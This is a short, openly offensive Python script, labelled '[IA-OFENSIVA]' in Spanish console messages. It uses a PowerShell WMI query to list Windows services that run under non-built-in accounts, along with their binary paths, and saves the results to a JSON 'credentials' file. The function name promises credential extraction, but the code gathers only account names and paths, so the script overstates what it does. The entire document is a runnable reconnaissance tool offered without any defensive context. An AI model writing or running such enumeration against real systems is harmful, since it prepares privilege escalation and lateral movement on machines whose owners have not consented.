import os, json, time
def extraer_credenciales():
 print("🔥 [IA-OFENSIVA] Extrayendo cuentas de servicio y descriptores nativos..."); r = {"timestamp": time.time(), "credenciales_servicios": []}
 cmd = "powershell -NoProfile -Command \"Get-WmiObject Win32_Service | Select-Object Name, StartName, PathName | ConvertTo-Json -Compress\""
 try:
  with os.popen(cmd) as f: salida = f.read().strip()
  if salida:
   try:
    datos = json.loads(salida)
    if isinstance(datos, dict): datos = [datos]
    for s in datos:
     name = s.get("Name", "")
     account = s.get("StartName", "")
     path = s.get("PathName", "")
     if account and not account.startswith("NT AUTHORITY"):
      r["credenciales_servicios"].append({"servicio": name, "cuenta_ejecucion": account, "ruta_binario": path})
   except Exception:
    r["raw_output"] = salida
 except Exception as e: r["error"] = str(e)
 with open("telemetria_credenciales.json", "w") as f: json.dump(r, f, indent=4)
 print("\n🏁 [IA-OFENSIVA] Extraccion de cuentas completada en 'telemetria_credenciales.json'.")
if __name__ == "__main__": extraer_credenciales()
